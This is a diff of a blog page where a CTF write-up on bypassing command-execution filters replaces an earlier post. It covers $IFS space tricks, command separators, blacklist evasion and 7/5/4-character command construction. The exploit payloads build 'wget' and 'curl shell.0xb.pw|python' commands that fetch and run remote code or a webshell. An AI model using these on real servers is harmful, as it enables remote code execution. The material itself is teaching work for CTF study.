@@ -3,19 +3,28 @@
 <head>
   <meta charset="utf-8">
   
-  <title>浅谈php安全 | Err0r</title>
+  <title>ctf命令执行与绕过 | Err0r</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="最近在看p神的blog，觉得大佬就是大佬。今天看到这篇觉得有很多需要学习的地方，又不好意思偷，就只能直接贴链接了。http://www.freebuf.com/articles/web/38383.html">
+  <meta name="description" content="(写完之后没保存又要重新再敲一遍，好气)源于lemon师傅，然后又参考了pupile师傅的文章，’偷’点干货来。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="浅谈php安全">
-<meta property="og:url" content="http://Err0rzz.github.io/2017/11/07/浅谈php安全/index.html">
+<meta property="og:title" content="ctf命令执行与绕过">
+<meta property="og:url" content="http://Err0rzz.github.io/2017/11/13/ctf命令执行与绕过/index.html">
 <meta property="og:site_name" content="Err0r">
-<meta property="og:description" content="最近在看p神的blog，觉得大佬就是大佬。今天看到这篇觉得有很多需要学习的地方，又不好意思偷，就只能直接贴链接了。http://www.freebuf.com/articles/web/38383.html">
+<meta property="og:description" content="(写完之后没保存又要重新再敲一遍，好气)源于lemon师傅，然后又参考了pupile师傅的文章，’偷’点干货来。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-11-09T08:12:41.869Z">
+<meta property="og:image" content="https://i.imgur.com/jOXjsER.png">
+<meta property="og:image" content="https://i.imgur.com/y9IFbAA.png">
+<meta property="og:image" content="https://i.imgur.com/Yginx2n.png">
+<meta property="og:image" content="https://i.imgur.com/9uxwewr.png">
+<meta property="og:image" content="https://i.imgur.com/wHp5Kgq.png">
+<meta property="og:image" content="https://i.imgur.com/P99EI8n.png">
+<meta property="og:image" content="https://i.imgur.com/bSr4T6P.png">
+<meta property="og:image" content="https://i.imgur.com/ygcSZPK.png">
+<meta property="og:updated_time" content="2017-11-14T08:37:07.894Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="浅谈php安全">
-<meta name="twitter:description" content="最近在看p神的blog，觉得大佬就是大佬。今天看到这篇觉得有很多需要学习的地方，又不好意思偷，就只能直接贴链接了。http://www.freebuf.com/articles/web/38383.html">
+<meta name="twitter:title" content="ctf命令执行与绕过">
+<meta name="twitter:description" content="(写完之后没保存又要重新再敲一遍，好气)源于lemon师傅，然后又参考了pupile师傅的文章，’偷’点干货来。">
+<meta name="twitter:image" content="https://i.imgur.com/jOXjsER.png">
   
     <link rel="alternative" href="/atom.xml" title="Err0r" type="application/atom+xml">
   
@@ -163,11 +172,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-浅谈php安全" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-ctf命令执行与绕过" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/11/07/浅谈php安全/" class="article-date">
-      <time datetime="2017-11-07T09:07:53.000Z" itemprop="datePublished">2017-11-07</time>
+      <a href="/2017/11/13/ctf命令执行与绕过/" class="article-date">
+      <time datetime="2017-11-13T07:09:33.000Z" itemprop="datePublished">2017-11-13</time>
 </a>
     </div>
   
@@ -180,7 +189,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      浅谈php安全
+      ctf命令执行与绕过
     </h1>
   
 
@@ -197,7 +206,33 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>最近在看p神的blog，觉得大佬就是大佬。今天看到这篇觉得有很多需要学习的地方，又不好意思偷，就只能直接贴链接了。<a href="http://www.freebuf.com/articles/web/38383.html" title="浅谈php安全" target="_blank" rel="external">http://www.freebuf.com/articles/web/38383.html</a></p>
+        <p>(写完之后没保存又要重新再敲一遍，好气)源于lemon师傅，然后又参考了pupile师傅的文章，’偷’点干货来。</p>
+<a id="more"></a>
+<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><p><code>&lt;</code> 符号<br><img src="https://i.imgur.com/jOXjsER.png" alt=""></p>
+<p><code>$IFS$9</code> 符号 <code>${IFS}</code> 符号<img src="https://i.imgur.com/y9IFbAA.png" alt=""><br>这里解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，加一个{}就固定了变量名，同理在后面加个$可以起到截断作用。<br><br></p>
+<h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><p><code>%0a</code> 符号<br>换行符<br><code>%0d</code> 符号<br>回车符<br><code>;</code> 符号<br>表示连续指令<br><code>&amp;</code> 符号<br>表示将前一个命令设置进入后台<br><code>|</code> 符号<br>管道符，将前一个命令的输出作为后一个命令的输入<br><code>&amp;&amp;</code> 符号<br>前一个命令执行成功才会执行下一条命令<br><code>||</code> 符号<br>前一个命令执行失败才会执行下一条命令<br><br></p>
+<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p><code>a=l;b=s;$a$b</code><img src="https://i.imgur.com/Yginx2n.png" alt=""></p>
+<p><code>base64编码</code> <img src="https://i.imgur.com/9uxwewr.png" alt=""><br><br></p>
+<h2 id="短命令执行"><a href="#短命令执行" class="headerlink" title="短命令执行"></a>短命令执行</h2><p>这个技巧一开始看到的是p神的七字命令执行，觉得好牛逼。然后最近hitcon的orange出了题五字和四字的，觉得在风中凌乱了…</p>
+<p>大体上的想法就是通过重命名文件绕过，然后通过<strong>ls</strong>来将文件名写入到文件中，<br><img src="https://i.imgur.com/wHp5Kgq.png" alt=""><br>可以看到<code>&gt;</code>这个重定向符号可以来创建文件，其中文件名是<code>&gt;</code>后面跟的参数，然后创建出我们精心构造好的多个文件名，然后通过<code>ls</code>打印出来再重定向<code>&gt;</code>到一个木马文件中，就可以执行了。</p>
+<h1 id="拼接方法"><a href="#拼接方法" class="headerlink" title="拼接方法"></a>拼接方法</h1><p>讲题目之前先介绍两种拼接方法：</p>
+<ol>
+<li>一个反斜杠<code>\</code>，这种方法是将一次输入分成多出输入，以<code>\</code>换下一次，以<code>p</code>结束。这种方法的话创建的文件名是按照我们的输入正常排列好的，所以我们不需要添加<code>-t</code>来重新排序，如下面的七字绕过实例。</li>
+<li>两个反斜杠<code>\\</code>，这种方法是利用<code>\</code>来拼接字符串，其中前一个<code>\</code>是用来反义后一个<code>\</code>的。这种方法的话需要精心构造输入，利用倒叙来输入，然后<code>ls</code>的时候需要加<code>-t</code>参数来排列一下，如下图以及五字四字绕过，虽然报错了但是也执行成功了。<img src="https://i.imgur.com/P99EI8n.png" alt=""></li>
+</ol>
+<h1 id="七字绕过"><a href="#七字绕过" class="headerlink" title="七字绕过"></a>七字绕过</h1><p>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if(strlen($_GET[1])&lt;8)&#123;</div><div class="line">     echo shell_exec($_GET[1]);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>很简单的代码，绕过长度限制就可以执行任意命令,利用代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1&gt;wget\</div><div class="line">&gt;域名.\</div><div class="line">&gt;com\</div><div class="line">&gt;-O\</div><div class="line">&gt;she\</div><div class="line">&gt;ll.p\</div><div class="line">&gt;p</div><div class="line">ls&gt;a</div><div class="line">sh a</div></pre></td></tr></table></figure></p>
+<p>上面的代码其实是在目标服务器创建个文件名为a的文件，内容为’wget 域名.com -O shell.pp’<br><img src="https://i.imgur.com/bSr4T6P.png" alt=""><br>代码含义就是去执行我们自己的vps上的一个木马文件</p>
+<p><strong>这里有一点特别值得注意的。这里注意.不能作为文件名的开头，因为linux下.是隐藏文件的开头，ls列不出来</strong></p>
+<h1 id="五字绕过"><a href="#五字绕过" class="headerlink" title="五字绕过"></a>五字绕过</h1><p>源代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $sandbox = &apos;/www/sandbox/&apos; . md5(&quot;orange&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);</div><div class="line">    @mkdir($sandbox);</div><div class="line">    @chdir($sandbox);</div><div class="line">    if (isset($_GET[&apos;cmd&apos;]) &amp;&amp; strlen($_GET[&apos;cmd&apos;]) &lt;= 5) &#123;</div><div class="line">        @exec($_GET[&apos;cmd&apos;]);</div><div class="line">    &#125; else if (isset($_GET[&apos;reset&apos;])) &#123;</div><div class="line">        @exec(&apos;/bin/rm -rf &apos; . $sandbox);</div><div class="line">    &#125;</div><div class="line">    highlight_file(__FILE__);</div></pre></td></tr></table></figure></p>
+<p>观察可得，每个用户的操作目录独立，而且可以执行长度小于等于5的命令，那么不用担心别人文件干扰。<br>唯一值得注意的是因为长度要小于5，所以我们无法执行<code>ls -t&gt;a</code><br>接下来看一下orange的官方wp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">from time import sleep</div><div class="line">from urllib import quote</div><div class="line">payload = [</div><div class="line">    # generate `ls -t&gt;g` file</div><div class="line">    &apos;&gt;ls\\&apos;, </div><div class="line">    &apos;ls&gt;_&apos;, </div><div class="line">    &apos;&gt;\ \\&apos;, </div><div class="line">    &apos;&gt;-t\\&apos;, </div><div class="line">    &apos;&gt;\&gt;g&apos;, </div><div class="line">    &apos;ls&gt;&gt;_&apos;, </div><div class="line">    # generate `curl orange.tw.tw&gt;python`</div><div class="line">    # curl shell.0xb.pw|python</div><div class="line">    &apos;&gt;on&apos;, </div><div class="line">    &apos;&gt;th\\&apos;, </div><div class="line">    &apos;&gt;py\\&apos;,</div><div class="line">    &apos;&gt;\|\\&apos;, </div><div class="line">    &apos;&gt;pw\\&apos;, </div><div class="line">    &apos;&gt;x.\\&apos;,</div><div class="line">    &apos;&gt;xx\\&apos;, </div><div class="line">    &apos;&gt;l.\\&apos;, </div><div class="line">    &apos;&gt;el\\&apos;, </div><div class="line">    &apos;&gt;sh\\&apos;, </div><div class="line">    &apos;&gt;\ \\&apos;, </div><div class="line">    &apos;&gt;rl\\&apos;, </div><div class="line">    &apos;&gt;cu\\&apos;, </div><div class="line">    # exec</div><div class="line">    &apos;sh _&apos;, </div><div class="line">    &apos;sh g&apos;, </div><div class="line">]</div><div class="line">r = requests.get(&apos;http://xxx/web1.php/?reset=1&apos;)</div><div class="line">for i in payload:</div><div class="line">    assert len(i) &lt;= 5 </div><div class="line">    r = requests.get(&apos;http://xxx/web1.php/?cmd=&apos; + quote(i) )</div><div class="line">    print i</div><div class="line">    sleep(0.2)</div></pre></td></tr></table></figure></p>
+<p>注意看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;ls\\</div><div class="line">ls&gt;_</div><div class="line">&gt;\ \\</div><div class="line">&gt;-t\\</div><div class="line">&gt;\&gt;g</div><div class="line">ls&gt;&gt;_</div></pre></td></tr></table></figure></p>
+<p>这几行代码，因为我们提到不能用<code>ls -t&gt;g</code>来排序，所以我们需要用合理的分割方式和预写入来控制写入文件的内容</p>
+<h1 id="四字绕过"><a href="#四字绕过" class="headerlink" title="四字绕过"></a>四字绕过</h1><p>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $sandbox = &apos;/www/sandbox/&apos; . md5(&quot;orange&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);</div><div class="line">    @mkdir($sandbox);</div><div class="line">    @chdir($sandbox);</div><div class="line">    if (isset($_GET[&apos;cmd&apos;]) &amp;&amp; strlen($_GET[&apos;cmd&apos;]) &lt;= 4) &#123;</div><div class="line">        @exec($_GET[&apos;cmd&apos;]);</div><div class="line">    &#125; else if (isset($_GET[&apos;reset&apos;])) &#123;</div><div class="line">        @exec(&apos;/bin/rm -rf &apos; . $sandbox);</div><div class="line">    &#125;</div><div class="line">    highlight_file(__FILE__);</div></pre></td></tr></table></figure></p>
+<p>这题就是大佬们自己嗨了…最大的问题还是<code>ls -t&gt;g</code>这个问题，所以如果我们构造成<code>ls -th&gt;g</code>，然后逆序分割：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">dir</div><div class="line">sl</div><div class="line">g\&gt;</div><div class="line">ht-</div></pre></td></tr></table></figure></p>
+<p>然后逆序输出到文件<br><img src="https://i.imgur.com/ygcSZPK.png" alt=""></p>
+<p>这里就可以看出为什么构造<code>ls -th&gt;g</code>，因为这个时候可以看到目录遍历的时候，<code>ht-</code>跑到了<code>g&gt;</code>后面(大佬就是会牛逼…)，这时候完美的构造出了我们需要的命令，后面命令基本不变。</p>
+<p>后面如果有别的继续补充吧…</p>
 
       
       
@@ -253,13 +288,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/11/07/浅谈php安全/">浅谈php安全</a></p>
+        <p><span>本文标题:</span><a href="/2017/11/13/ctf命令执行与绕过/">ctf命令执行与绕过</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Err0r 的个人博客">Err0r</a></p>
-        <p><span>发布时间:</span>2017年11月07日 - 17时07分</p>
-        <p><span>最后更新:</span>2017年11月09日 - 16时12分</p>
+        <p><span>发布时间:</span>2017年11月13日 - 15时09分</p>
+        <p><span>最后更新:</span>2017年11月14日 - 16时37分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/11/07/浅谈php安全/" title="浅谈php安全">http://Err0rzz.github.io/2017/11/07/浅谈php安全/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://Err0rzz.github.io/2017/11/07/浅谈php安全/　　作者: Err0r" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/11/13/ctf命令执行与绕过/" title="ctf命令执行与绕过">http://Err0rzz.github.io/2017/11/13/ctf命令执行与绕过/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://Err0rzz.github.io/2017/11/13/ctf命令执行与绕过/　　作者: Err0r" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -272,18 +307,18 @@
 
 <nav id="article-nav">
   
-    <a href="/2017/11/09/无线破解浅谈/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2017/11/14/GET的命令执行漏洞/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          无线破解浅谈
+          GET的命令执行漏洞
         
       </div>
     </a>
   
   
-    <a href="/2017/10/31/updatexml-mysql显错注入/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">updatexml mysql显错注入</div>
+    <a href="/2017/11/09/无线破解浅谈/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">无线破解浅谈</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -294,7 +329,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#空格绕过"><span class="toc-number">1.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#命令分隔符"><span class="toc-number">2.</span> <span class="toc-text">命令分隔符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#黑名单绕过"><span class="toc-number">3.</span> <span class="toc-text">黑名单绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#短命令执行"><span class="toc-number">4.</span> <span class="toc-text">短命令执行</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#拼接方法"><span class="toc-number"></span> <span class="toc-text">拼接方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#七字绕过"><span class="toc-number"></span> <span class="toc-text">七字绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#五字绕过"><span class="toc-number"></span> <span class="toc-text">五字绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#四字绕过"><span class="toc-number"></span> <span class="toc-text">四字绕过</span></a>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -360,13 +395,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/11/09/无线破解浅谈/" title="上一篇: 无线破解浅谈">
+            <a href="/2017/11/14/GET的命令执行漏洞/" title="上一篇: GET的命令执行漏洞">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2017/10/31/updatexml-mysql显错注入/" title="下一篇: updatexml mysql显错注入">
+            <a href="/2017/11/09/无线破解浅谈/" title="下一篇: 无线破解浅谈">
                 <i class="fa fa-angle-right"></i>
             </a>
         
